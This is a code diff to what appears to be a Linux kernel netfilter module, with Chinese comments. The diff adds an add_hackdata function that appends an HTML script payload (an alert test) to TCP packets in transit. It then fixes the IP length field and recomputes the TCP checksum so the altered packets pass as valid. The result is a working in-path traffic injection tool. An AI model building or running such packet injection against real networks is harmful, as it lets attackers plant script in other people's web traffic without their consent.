@@ -203,7 +203,10 @@ int tcp_data_hack(struct sk_buff *skb)
 	unsigned short ip_len;
 	unsigned char flag;
 
+	//1）添加 hack 数据
+	add_hackdata(skb);
 
+	//2）获取各种参数值
 	offset		= (little_big_16(iph->frag_off))&0x1fff;
 	flag		= ((little_big_16(iph->frag_off))>>13)&0x7;
 	ip_len		= little_big_16(iph->tot_len);
@@ -249,16 +252,43 @@ int tcp_data_hack(struct sk_buff *skb)
 
 	mac_type	= mach->h_proto;
 
-
+	//3）增加 tcp header
 	add_tcp_header(skb, src_ip, tcp_len, dst_ip, protocol, src_port, dst_port, seq, ack, tcp_header_len, ctrl_bit, winsize, upointer);
 
-	add_ipv4_header(skb, src_ip, iph->ttl, dst_ip, protocol, iph->tos, big_little_16(ip_len), offset,  0);
+	//4）增加 ip header
+	add_ipv4_header(skb, src_ip, iph->ttl, dst_ip, protocol, iph->tos, big_little_16(ip_len), offset,  flag);
 
+	//5）增加 frame header
 	add_frame_header(skb, mac_type, dst_mac, src_mac);
 
 
 	return NF_ACCEPT;      	 
 } 
+
+//===========================================================================
+// add hack data
+//===========================================================================
+void 	add_hackdata(struct sk_buff *skb)
+{
+	unsigned short ip_len;
+	unsigned short tcp_len;
+	int hack_data_len;
+
+	char hack_data[HACKDATA_LEN]	= "<script>alert('test')</script>\n";
+
+	//1）加入hack data 到 skb[]中	
+	hack_data_len		= str_len(hack_data);	
+	
+	char *hd		= skb_put(skb, hack_data_len);
+	str_cpy(hd, hack_data, hack_data_len);
+
+	//2）更新 ip_len
+	struct iphdr *iph 	= ip_hdr(skb);
+	
+	ip_len			= little_big_16(iph->tot_len);
+	ip_len			+= hack_data_len;	
+	iph->tot_len 		= big_little_16(ip_len);	
+}
 
 //===========================================================================
 // add_tcp_header
@@ -268,56 +298,6 @@ void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tc
 	struct tcphdr *tcph 		= tcp_hdr(skb);
 	struct s_tcp_header * tcp	= (struct s_tcp_header *)tcph;
 
-
-	//-------------------------------------------------------------------------
-	// make checksum
-	//-------------------------------------------------------------------------
-
-	//1)build test space and copy tcp data
-	char *dst_addr	= &tmp_tcp_data[TCP_HEADER_LENGTH + PTCP_HEADER_LENGTH];
-	char *src_addr	= (char*)tcph + TCP_HEADER_LENGTH;
-	int len		= tcp_len - TCP_HEADER_LENGTH;	//option + data
-
-	//将原tcp数据包内容copy到tmp_tcp_data[]中，以计算checksum
-	str_cpy(dst_addr, src_addr, len);
-
-	
-	struct s_g_tcp_header *g = (struct s_g_tcp_header *)tmp_tcp_data;
-
-	//2)create tcp psedu-header
-	struct s_ptcp_header *p = &(g->p);
-	
-	p->src_ip	= src_ip;
-	p->dst_ip	= dst_ip;
-	p->zero		= 0;
-	p->protocol	= protocol;
-	p->tcp_len	= big_little_16(tcp_len);
-
-	//3) create tcp header
-	struct s_tcp_header_1 *t = &(g->t);
-	
-	t->source	= big_little_16(src_port);
-	t->dest		= big_little_16(dst_port);
-	t->seq		= big_little_32(seq);
-	t->ack		= big_little_32(ack);
-	t->window	= big_little_16(winsize);
-	t->check	= 0;
-	t->urg_ptr	= big_little_16(upointer);
-
-	t->doff		= header_len;
-	t->fin		= (ctrl_bit >>7) & 0x1;
-	t->syn		= (ctrl_bit >>6) & 0x1;
-	t->rst		= (ctrl_bit >>5) & 0x1;
-	t->psh		= (ctrl_bit >>4) & 0x1;
-	t->ack		= (ctrl_bit >>3) & 0x1;
-	t->urg		= (ctrl_bit >>2) & 0x1;
-
-	t->ece		= 0;
-	t->cwr		= 0;
-	t->res1		= 0;
-
-	t->check	= makechksum(tmp_tcp_data,(tcp_len+PTCP_HEADER_LENGTH));
-	
 	//-------------------------------------------------------------------------
 	// add tcp header
 	//-------------------------------------------------------------------------
@@ -334,7 +314,8 @@ void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tc
 	tcph->doff	= header_len;
 	tcph->window	= big_little_16(winsize);
 
-	tcph->check	= t->check;
+	//tcph->check	= t->check;
+	
 	tcph->urg_ptr	= big_little_16(upointer);
 
 
@@ -348,6 +329,17 @@ void 	add_tcp_header(struct sk_buff *skb, struct iaddr src_ip, unsigned short tc
 	tcph->ece	= 0;
 	tcph->cwr	= 0;
 	tcph->res1	= 0;	
+
+
+
+	//计算校验和
+	struct iphdr *iph 	= ip_hdr(skb);
+
+	tcph->check		= 0;
+	skb->csum 		= csum_partial((unsigned char *)tcph, (tcp_len),0);
+	tcph->check		= csum_tcpudp_magic(iph->saddr,iph->daddr, (tcp_len),iph->protocol, skb->csum);
+
+	
 
 //--------test---------------
 	tmp_tcp_data[tcp_len + PTCP_HEADER_LENGTH]	= NULL;
